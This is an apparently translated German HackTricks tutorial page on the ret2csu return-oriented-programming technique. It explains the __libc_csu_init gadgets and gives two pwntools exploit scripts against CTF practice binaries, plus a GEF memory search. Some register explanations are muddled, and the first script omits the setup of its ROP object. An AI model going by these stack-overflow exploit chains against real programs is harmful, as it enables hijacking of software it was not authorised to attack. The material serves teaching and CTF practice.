# Ret2csu

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

##

## [https://www.scs.stanford.edu/brop/bittau-brop.pdf](https://www.scs.stanford.edu/brop/bittau-brop.pdf)Grundlegende Informationen

**ret2csu** ist eine Hacking-Technik, die verwendet wird, wenn Sie versuchen, die Kontrolle √ºber ein Programm zu √ºbernehmen, aber die **Gadgets**, die Sie normalerweise verwenden, um das Verhalten des Programms zu manipulieren, nicht finden k√∂nnen.&#x20;

Wenn ein Programm bestimmte Bibliotheken verwendet (wie libc), verf√ºgt es √ºber einige integrierte Funktionen zur Verwaltung der Kommunikation zwischen verschiedenen Teilen des Programms. Unter diesen Funktionen befinden sich einige versteckte Sch√§tze, die als unsere fehlenden Gadgets fungieren k√∂nnen, insbesondere eine namens `__libc_csu_init`.

### Die magischen Gadgets in \_\_libc\_csu\_init

In **`__libc_csu_init`** gibt es zwei Sequenzen von Anweisungen (Gadgets), die hervorgehoben werden m√ºssen:

1. Die erste Sequenz erm√∂glicht es uns, Werte in mehreren Registern (rbx, rbp, r12, r13, r14, r15) einzurichten. Diese dienen als Speicherpl√§tze, in denen wir Zahlen oder Adressen speichern k√∂nnen, die wir sp√§ter verwenden m√∂chten.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Dieses Gadget erm√∂glicht es uns, diese Register zu steuern, indem wir Werte vom Stapel in sie laden.

2. Die zweite Sequenz verwendet die von uns festgelegten Werte, um ein paar Dinge zu tun:
* **Bestimmte Werte in andere Register verschieben**, um sie f√ºr uns als Parameter in Funktionen vorzubereiten.
* **Einen Aufruf an eine Position durchf√ºhren**, die durch Addition der Werte in r15 und rbx bestimmt wird, und dann rbx mit 8 multipliziert.
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```
2. Vielleicht kennen Sie keine Adresse, die Sie dort eingeben k√∂nnen, und Sie **ben√∂tigen eine `ret`-Anweisung**. Beachten Sie, dass das zweite Gadget ebenfalls **mit einem `ret` enden wird**, aber Sie m√ºssen einige **Bedingungen** erf√ºllen, um es zu erreichen:
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
add rbx, 0x1;
cmp rbp, rbx
jnz <func>
...
ret
```
Die Bedingungen werden sein:

- `[r12 + rbx*8]` muss auf eine Adresse zeigen, die eine aufrufbare Funktion speichert (wenn keine Idee und kein PIE vorhanden sind, k√∂nnen Sie einfach die Funktion `_init` verwenden).
- Wenn \_init sich an der Adresse `0x400560` befindet, verwenden Sie GEF, um nach einem Zeiger im Speicher darauf zu suchen und stellen Sie sicher, dass `[r12 + rbx*8]` die Adresse mit dem Zeiger auf \_init ist.
```bash
# Example from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
gef‚û§  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
0x400e38 - 0x400e44  ‚Üí   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
0x600e38 - 0x600e44  ‚Üí   "\x60\x05\x40[...]"
```
* `rbp` und `rbx` m√ºssen den gleichen Wert haben, um den Sprung zu vermeiden
* Es gibt einige ausgelassene Pops, die ber√ºcksichtigt werden m√ºssen

## RDI und RSI

Eine weitere M√∂glichkeit, **`rdi`** und **`rsi`** aus dem Ret2csu-Gadget zu steuern, besteht darin, auf spezifische Offset zuzugreifen:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt="" width="283"><figcaption><p><a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">https://www.scs.stanford.edu/brop/bittau-brop.pdf</a></p></figcaption></figure>

√úberpr√ºfen Sie diese Seite f√ºr weitere Informationen:

{% content-ref url="brop-blind-return-oriented-programming.md" %}
[brop-blind-return-oriented-programming.md](brop-blind-return-oriented-programming.md)
{% endcontent-ref %}

## Beispiel

### Verwendung des Aufrufs

Stellen Sie sich vor, Sie m√∂chten einen Systemaufruf machen oder eine Funktion wie `write()` aufrufen, aber spezifische Werte in den Registern `rdx` und `rsi` als Parameter ben√∂tigen. Normalerweise w√ºrden Sie nach Gadgets suchen, die diese Register direkt setzen, aber Sie finden keine.

Hier kommt **ret2csu** ins Spiel:

1. **Registrierungen einrichten**: Verwenden Sie den ersten magischen Gadget, um Werte vom Stapel in rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) und r15 zu laden.
2. **Verwenden des zweiten Gadgets**: Mit diesen gesetzten Registern verwenden Sie den zweiten Gadget. Dies erm√∂glicht es Ihnen, Ihre ausgew√§hlten Werte in `rdx` und `rsi` zu verschieben (aus r14 und r13), um Parameter f√ºr einen Funktionsaufruf vorzubereiten. Dar√ºber hinaus k√∂nnen Sie durch die Kontrolle von `r15` und `rbx` das Programm dazu bringen, eine Funktion aufzurufen, die sich an der von Ihnen berechneten Adresse befindet und in `[r15 + rbx*8]` platziert wird.

Es gibt ein [**Beispiel f√ºr die Verwendung dieser Technik und deren Erkl√§rung hier**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), und dies ist der endg√ºltige Exploit, den es verwendet hat:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Beachten Sie, dass das vorherige Exploit nicht dazu gedacht ist, eine **`RCE`** durchzuf√ºhren, sondern lediglich eine Funktion namens **`win`** aufzurufen (die Adresse von `win` aus stdin aufruft, gets im ROP-Chain und speichert sie in r15) mit einem dritten Argument mit dem Wert `0xdeadbeefcafed00d`.
{% endhint %}

### Umgehen des Aufrufs und Erreichen von ret

Der folgende Exploit wurde [**von dieser Seite**](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/ropemporium\_ret2csu/index.html) extrahiert, auf der **ret2csu** verwendet wird, aber anstelle des Aufrufs die Vergleiche umgeht und den `ret` nach dem Aufruf erreicht:
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

from pwn import *

# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)

# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)

# Padding from start of input to saved return address
payload = "0"*0x28

# Our first gadget, and the values to be popped from the stack

# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX

# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15

# Finally the address of ret2win
payload += ret2win

# Send the payload
target.sendline(payload)
target.interactive()
```
### Warum nicht einfach libc direkt verwenden?

Normalerweise sind diese F√§lle auch anf√§llig f√ºr [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), aber manchmal m√ºssen mehr Parameter kontrolliert werden als mit den Gadgets, die direkt in libc gefunden werden k√∂nnen. Zum Beispiel erfordert die `write()`-Funktion drei Parameter, und **es ist m√∂glicherweise nicht m√∂glich, Gadgets zu finden, um diese direkt zu setzen**.
